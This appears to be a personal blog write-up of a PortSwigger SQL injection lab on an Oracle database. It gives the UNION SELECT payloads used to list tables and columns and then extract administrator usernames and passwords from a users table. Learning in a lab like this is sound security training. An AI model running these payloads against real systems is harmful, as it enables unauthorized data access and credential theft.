+++
title = 'Sql Injection Listing Databse Contents'
date = 2024-07-19T16:33:29+05:30
slug = "portswigger-SQL-database-listing-oracle-databse"
categories = ["portswigger","SQL injection","listing databsse contents","noracle databases"]
+++

![](https://dl.dropbox.com/scl/fi/rocv21p8e6vsvm81vytl3/Pasted-image-20240528164508.png?rlkey=n27fgzgqr2lvv3xwdxk0qtkeg&st=byi3qpz0&dl=0)

From the LAB description there is a SQL Vulnerability in the product category filter and to complete this lab we need to log in as administrator 

this lab contains oracle database 
refer to [SQL CHEAT SHEET](../SQL%20CHEAT%20SHEET.md) for payloads

HINT:
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

let's know about dual 

https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Selecting-from-the-DUAL-Table.html


i've captured the request and sent into the repeater 

This website has 2 columns too since we got internal server with order by 3

let's check for data type to perform union attack 

![](https://dl.dropbox.com/scl/fi/l0xpvcq2pvb3k7xmhtgk7/Pasted-image-20240528165117.png?rlkey=tp9ksqc4uairwjly13fgmesai&st=pfk7z1fb&dl=0)

we now know that both are of same text we can inject our paylaoads

From the cheat sheet since it's a oracle database


 `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

will list all the 

![](https://dl.dropbox.com/scl/fi/thf3i5lxiw9cbqdv6uhc8/Pasted-image-20240528165310.png?rlkey=l5ijekqp5pbl96y9a8t79fbqn&st=mb57wazq&dl=0)

we've got some table listed let's go through tables and find what we r looking for

![](https://dl.dropbox.com/scl/fi/q0i4brdaqogrqdiw3i9iw/Pasted-image-20240528165534.png?rlkey=2or4rmotzufhsc7o20b0mr0uj&st=hi0i2aau&dl=0)

we've got our username table now let's view that table
username table : USERS_QFTLRV

to view the details of username table 

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QFTLRV'--

![](https://dl.dropbox.com/scl/fi/oe7rdv9r7czfnd5pcflch/Pasted-image-20240528165801.png?rlkey=nef1pd2a8usio7llrvakrw2po&st=0l867he8&dl=0)

password table : PASSWORD_KSZHEB
username : USERNAME_PNBHKP
now  let's retrieve the details 

payload will be 

'+UNION+SELECT+USERNAME_PNBHKP,+PASSWORD_KSZHEB+FROM+USERS_QFTLRV--

![](https://dl.dropbox.com/scl/fi/ckpgvwyct58q4on0sw1kr/Pasted-image-20240528170016.png?rlkey=4gm1qvjyzncm22m7o59y2ssjm&st=qqyl5kkz&dl=0)

we got the administrator details let's login to our account to solve the lab 

![](https://dl.dropbox.com/scl/fi/zmav0e8c16m4w55ea9936/Pasted-image-20240528170228.png?rlkey=gajo12hoh0fobly7hfslk0t2e&st=qe39tsvl&dl=0)